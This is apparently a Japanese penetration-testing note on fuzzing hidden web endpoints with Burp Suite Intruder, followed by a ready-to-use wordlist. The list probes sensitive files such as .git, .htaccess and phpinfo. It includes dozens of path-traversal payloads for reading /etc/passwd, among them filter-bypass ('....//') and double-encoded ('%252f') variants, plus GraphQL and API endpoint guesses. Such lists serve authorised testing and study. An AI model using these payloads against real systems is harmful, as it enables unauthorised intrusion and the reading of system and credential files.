
## Fuzz

- Intruderで隠されたエンドポイントを暴く(GETリクエスト)
- レスポンスStatus: 404以外に注目👀

###### wordlist

==⚠️Intruderで"URL-encode these characters"のチェックを外す
```
admin
.htaccess
robots.txt
.git
.DS_Store
cgi-bin/phpinfo.php
etc/passwd
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
....//etc/passwd
....//....//etc/passwd
....//....//....//etc/passwd
....//....//....//....//etc/passwd
....//....//....//....//....//etc/passwd
....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//etc/passwd
..%252fetc/passwd
..%252f..%252fetc/passwd
..%252f..%252f..%252fetc/passwd
..%252f..%252f..%252f..%252fetc/passwd
..%252f..%252f..%252f..%252f..%252fetc/passwd
..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
graphql
api
api/graphql
graphql/api
graphql/graphql
v1/graphql
v1/api
v1/api/graphql
v1/graphql/api
v1/graphql/graphql
graphql/v1
api/v1
api/graphql/v1
graphql/api/v1
graphql/graphql/v1
```
